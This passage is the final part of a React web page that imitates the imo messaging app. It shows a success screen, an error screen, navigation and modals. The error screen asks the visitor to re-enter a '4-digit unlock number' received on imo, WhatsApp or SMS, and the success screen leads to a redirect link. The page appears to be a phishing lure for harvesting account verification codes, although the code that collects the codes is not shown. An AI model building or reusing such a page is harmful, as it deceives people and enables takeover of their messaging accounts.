                                    <h3 className="text-2xl font-bold text-green-700 mb-3">Successful!</h3>
                                    <p className="text-slate-600 text-sm mb-8 font-medium">Come to imo, and become friends with me!</p>
                                    <button onClick={() => window.location.href = REDIRECT_LINK} className="w-full bg-[#0091ea] text-white font-bold py-4 rounded-xl shadow-lg hover:bg-[#0081d0] transition-colors">
                                        View Profile
                                    </button>
                                </div>
                            )}

                            {/* ERROR STEP */}
                            {step === 'ERROR' && (
                                <div className="text-center py-8">
                                    <div className="w-20 h-20 bg-red-50 text-red-500 rounded-full flex items-center justify-center mx-auto mb-6">
                                        <i className="fa-solid fa-triangle-exclamation text-4xl"></i>
                                    </div>
                                    <h3 className="text-xl font-bold text-red-600 mb-3">Wrong Unlock Number!</h3>
                                    <p className="text-slate-600 text-sm mb-8 leading-relaxed px-2 font-medium">
                                        The unlock number you entered is incorrect. Please unlock using the correct 4-digit unlock number received on your imo, whatsapp or message option.
                                    </p>
                                    <button onClick={handleRetry} className="w-full bg-red-500 hover:bg-red-600 text-white font-bold py-4 rounded-xl shadow-lg active:scale-95 transition-transform">
                                        Try Again
                                    </button>
                                </div>
                            )}

                        </div>
                    </div>

                    {/* NAVIGATION */}
                    <div className="h-16 bg-white border-t border-slate-200 flex justify-around items-center shrink-0 z-30 shadow-[0_-2px_10px_rgba(0,0,0,0.02)]">
                        <div className="flex flex-col items-center text-[#0091ea] cursor-pointer active:scale-95 transition">
                            <i className="fa-solid fa-comment-dots text-xl mb-1"></i>
                            <span className="text-[10px] font-bold">Chats</span>
                        </div>
                        <div className="flex flex-col items-center text-slate-400 cursor-pointer active:scale-95 transition hover:text-slate-600">
                            <i className="fa-solid fa-globe text-xl mb-1"></i>
                            <span className="text-[10px] font-medium">Explore</span>
                        </div>
                        <div className="flex flex-col items-center text-slate-400 cursor-pointer active:scale-95 transition hover:text-slate-600">
                            <i className="fa-regular fa-address-book text-xl mb-1"></i>
                            <span className="text-[10px] font-medium">Contacts</span>
                        </div>
                    </div>

                    {/* MODALS */}
                    <CountrySelector 
                        isOpen={showCountryModal} 
                        onClose={() => setShowCountryModal(false)}
                        onSelect={setSelectedCountry}
                    />
                    
                    {showStories && (
                        <StoryViewer onClose={() => setShowStories(false)} />
                    )}

                </div>
            );
        };

        const root = ReactDOM.createRoot(document.getElementById('root'));
        root.render(<App />);
    </script>
</body>
</html>
</html>
